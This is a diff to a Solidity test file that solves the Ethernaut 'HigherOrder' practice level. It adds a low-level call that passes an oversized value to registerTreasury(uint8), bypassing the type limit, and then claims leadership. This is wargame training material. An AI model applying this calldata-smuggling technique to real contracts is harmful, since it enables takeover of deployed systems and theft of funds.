@@ -7,6 +7,7 @@ import {Utils} from "test/utils/Utils.sol";
 import {DummyFactory} from "src/levels/DummyFactory.sol";
 import {Level} from "src/levels/base/Level.sol";
 import {Ethernaut} from "src/Ethernaut.sol";
+import {Address} from "openzeppelin-contracts-v5.4.0/utils/Address.sol";
 
 interface HigherOrder {
     function claimLeadership() external;
@@ -62,6 +63,7 @@ contract TestHigherOrder is Test, Utils {
 
     /// @notice Test the solution for the level.
     function testSolve() public checkSolvedByPlayer{
-
+        Address.functionCall(address(instance), abi.encodeWithSignature("registerTreasury(uint8)", (bytes32(uint256(266)))));
+        instance.claimLeadership();
     }
 }
